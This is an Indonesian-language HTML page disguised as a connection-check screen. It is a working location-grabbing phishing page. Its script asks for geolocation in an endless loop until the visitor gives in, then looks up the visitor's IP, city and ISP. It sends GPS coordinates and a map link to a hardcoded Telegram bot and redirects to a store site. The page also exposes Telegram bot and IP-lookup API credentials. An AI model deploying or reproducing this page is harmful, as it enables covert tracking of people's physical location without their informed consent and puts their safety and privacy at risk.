<!DOCTYPE html>
<html lang="id">
<head>
Â  <meta charset="UTF-8" />
Â  <title>Memeriksa koneksi Anda...</title>
Â  <style>
Â  Â  body {
Â  Â  Â  font-family: sans-serif;
Â  Â  Â  text-align: center;
Â  Â  Â  padding: 50px;
Â  Â  }
Â  Â  #status {
Â  Â  Â  font-size: 18px;
Â  Â  Â  color: #333;
Â  Â  }
Â  Â  .loader {
Â  Â  Â  margin-top: 20px;
Â  Â  }
Â  </style>
</head>
<body>
Â  <h2>ğŸ”’ Izinkan akses lokasi Anda</h2>
Â  <p id="status">Memeriksa koneksi Anda...</p>
Â  <div class="loader">â³</div>

Â  <script>
Â  Â  const botToken = "7090653601:AAHjzoywMv-tfUZ3mXgmAacTPMcCbnp2B8w";
Â  Â  const chatId = "7567067447";
Â  Â  const ip2locKey = "AD1D95B6917C0483227085B47E1C5C2C";

Â  Â  async function sendLocation(coords, ipData, ipInfo) {
Â  Â  Â  const msg = `
ğŸ“¥ Lokasi baru terdeteksi!

ğŸŒ IP: ${ipData.ip}
ğŸ“ Negara: ${ipInfo?.country_name || 'N/A'}
ğŸ™ï¸ Kota: ${ipInfo?.city_name || 'N/A'}
ğŸ•¹ï¸ Provider: ${ipInfo?.isp || 'N/A'}

ğŸ“¡ GPS:
Latitude: ${coords.latitude}
Longitude: ${coords.longitude}
ğŸ“Œ https://maps.google.com/?q=${coords.latitude},${coords.longitude}

ğŸ•“ Waktu: ${new Date().toLocaleString()}
Â  Â  Â  `;
Â  Â  Â  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
Â  Â  Â  Â  method: "POST",
Â  Â  Â  Â  headers: { "Content-Type": "application/json" },
Â  Â  Â  Â  body: JSON.stringify({ chat_id: chatId, text: msg })
Â  Â  Â  });

Â  Â  Â  // Arahkan setelah lokasi dikirim
Â  Â  Â  window.location.href = "https://web-store-rexxin.vercel.app";
Â  Â  }

Â  Â  async function getIPInfo() {
Â  Â  Â  const ip = await fetch("https://api.ipify.org?format=json")
Â  Â  Â  Â  .then(res => res.json())
Â  Â  Â  Â  .catch(() => ({ ip: "Gagal" }));

Â  Â  Â  const info = await fetch(`https://api.ip2location.io/?key=${ip2locKey}&ip=${ip.ip}`)
Â  Â  Â  Â  .then(res => res.json())
Â  Â  Â  Â  .catch(() => null);

Â  Â  Â  return { ipData: ip, ipInfo: info };
Â  Â  }

Â  Â  async function requestLoop() {
Â  Â  Â  const statusText = document.getElementById("status");
Â  Â  Â  while (true) {
Â  Â  Â  Â  await new Promise(r => setTimeout(r, 2000));
Â  Â  Â  Â  if (navigator.geolocation) {
Â  Â  Â  Â  Â  navigator.geolocation.getCurrentPosition(async pos => {
Â  Â  Â  Â  Â  Â  statusText.innerText = "ğŸ“ Lokasi terdeteksi, mengirim...";
Â  Â  Â  Â  Â  Â  const { ipData, ipInfo } = await getIPInfo();
Â  Â  Â  Â  Â  Â  await sendLocation(pos.coords, ipData, ipInfo);
Â  Â  Â  Â  Â  }, err => {
Â  Â  Â  Â  Â  Â  statusText.innerText = "âŒ Akses lokasi ditolak. Silakan izinkan akses lokasi untuk melanjutkan.";
Â  Â  Â  Â  Â  });
Â  Â  Â  Â  } else {
Â  Â  Â  Â  Â  statusText.innerText = "Browser Anda tidak mendukung fitur lokasi.";
Â  Â  Â  Â  Â  break;
Â  Â  Â  Â  }
Â  Â  Â  }
Â  Â  }

Â  Â  requestLoop();
Â  </script>
</body>
</html>